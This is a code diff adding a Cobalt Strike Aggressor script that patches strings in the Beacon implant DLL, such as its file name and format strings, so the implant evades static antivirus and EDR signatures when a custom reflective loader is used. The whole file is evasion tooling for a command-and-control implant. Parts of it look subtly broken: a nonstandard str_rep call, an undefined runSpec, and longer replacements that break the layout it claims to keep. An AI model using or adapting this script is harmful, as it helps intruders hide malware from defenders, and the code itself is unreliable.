@@ -1,0 +1,35 @@
+# strrep_pad — Static Signature Evasion for Beacon DLLs
+#
+# Malleable C2's stage.transform.strrep only applies with the default
+# reflective loader. When a custom UDRL is in use, equivalent string
+# replacement must be performed in Aggressor before the DLL is passed
+# to Crystal Palace.
+#
+# The strrep_pad function replaces a string and pads with null bytes
+# to preserve the DLL layout.
+
+sub strrep_pad {
+    local('$dll $orig $new $orig_len $new_len $diff $pad');
+    $dll  = $1; $orig = $2; $new = $3;
+    $orig_len = strlen($orig);
+    $new_len  = strlen($new);
+    $diff = $orig_len - $new_len;
+
+    # pad the replacement so the DLL layout is preserved
+    if ($diff > 0) { $pad = strrep($new . str_rep("\x00", $diff), "", ""); }
+    else           { $pad = $new; }
+
+    return strrep($dll, $orig, $pad);
+}
+
+set BEACON_RDLL_GENERATE {
+    local('$beacon $arch');
+    $beacon = $2; $arch = $3;
+
+    $beacon = strrep_pad($beacon, "beacon.x64.dll",   "bacon.x64.dll");
+    $beacon = strrep_pad($beacon, "%02d/%02d/%02d",   "%02d/%02d/%04d");
+    $beacon = strrep_pad($beacon, "%s as %s\\%s: %d", "%s - %s\\%s (%d)");
+
+    # then run through the spec file as before
+    return runSpec($beacon);
+}
